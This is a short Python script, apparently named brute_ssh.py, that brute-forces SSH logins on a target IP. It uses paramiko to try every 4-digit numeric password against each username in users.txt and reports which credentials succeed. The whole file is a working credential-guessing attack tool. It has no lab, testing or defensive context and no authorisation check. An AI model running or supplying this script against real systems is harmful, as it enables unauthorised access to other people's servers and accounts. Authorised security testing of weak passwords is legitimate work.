import paramiko
from itertools import product
import sys
import os

def try_ssh(host, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, username=username, password=password, timeout=3)
        print(f"[SUCCESS] Host: {host} | User: {username} | Password found: {password}")
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        print(f"[FAILED] Host: {host} | User: {username} | Password: {password}")
        return False
    except Exception as e:
        print(f"[ERROR] Host: {host} | User: {username} | Password: {password} - {e}")
        return False

def brute_force_ssh(host, users):
    print(f"Starting brute force SSH for host {host} with all users and 4-digit numeric passwords...")
    for user in users:
        print(f"\nTrying Host: {host} | User: {user}")
        for combo in product("0123456789", repeat=4):
            password = ''.join(combo)
            if try_ssh(host, user, password):
                print("Brute force completed for this user.\n")
                break

def load_users():
    file_path = "users.txt"
    if not os.path.exists(file_path):
        print(f"File users.txt not found!")
        sys.exit(1)
    with open(file_path, "r") as f:
        return [line.strip() for line in f if line.strip()]

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python brute_ssh.py <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    users = load_users()

    brute_force_ssh(target_ip, users)
